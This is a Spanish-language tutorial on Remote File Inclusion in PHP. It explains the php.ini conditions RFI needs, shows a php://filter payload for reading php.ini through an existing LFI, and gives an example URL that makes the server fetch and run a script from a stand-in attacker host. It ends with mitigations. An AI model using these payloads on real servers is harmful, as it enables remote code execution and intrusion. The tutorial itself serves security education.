# RFI: Remote File Inclusion

## Qué es y por qué es más raro hoy

**RFI (Remote File Inclusion)** es la variante de inclusión de archivos donde la ruta que la aplicación carga apunta a un recurso **externo** — una URL `http://` o `https://` en lugar de una ruta local. El resultado: el servidor descarga y ejecuta un script alojado en otro servidor, completamente controlado por el atacante.

Esto es más grave que LFI en impacto directo (el atacante puede modificar el script remoto en cualquier momento), pero bastante menos frecuente, porque requiere dos condiciones:

```ini
; php.ini — ambas deben estar habilitadas:
allow_url_fopen = On       ; por defecto: On
allow_url_include = On     ; por defecto: Off
```

`allow_url_include` está desactivado por defecto desde PHP 5.2, lo que hace que RFI sea raro en instalaciones modernas. Pero sigue apareciendo en:
- Aplicaciones heredadas que requirieron esta configuración para funcionar.
- Entornos mal configurados o con plantillas de configuración antiguas.
- Plataformas de hosting compartido que no actualizan sus configuraciones base.

## Confirmando si RFI es posible

Antes de intentar RFI, se puede verificar si `allow_url_include` está habilitado leyendo el `php.ini` vía LFI (si ya hay LFI confirmado):

```
?language=php://filter/read=convert.base64-encode/resource=/etc/php/7.4/apache2/php.ini
```

Decodificando el resultado, buscar `allow_url_include` — si el valor es `On`, RFI es viable.

## El vector de ataque

Con RFI, en lugar de referenciar un archivo local, se apunta a una URL controlada:

```
?language=http://servidor-atacante.com/script.php
```

El servidor descarga `script.php` desde el servidor del atacante y lo ejecuta como si fuera un archivo local propio, con todos los privilegios del proceso web.

## Por qué el impacto es inmediato y completo

A diferencia de LFI (donde se necesitan técnicas adicionales como log poisoning o upload+include para llegar a RCE), RFI convierte directamente la inclusión en ejecución de código arbitrario — el contenido del script remoto se ejecuta en el contexto del servidor vulnerable.

## Mitigación

```ini
; php.ini
allow_url_include = Off  ; la medida principal
allow_url_fopen   = Off  ; si la aplicación no necesita leer URLs externas
```

A nivel de red: un firewall que bloquee las conexiones HTTP salientes del servidor web hacia internet también impide que el servidor descargue el script remoto, aunque esto no corrige la vulnerabilidad de código subyacente.
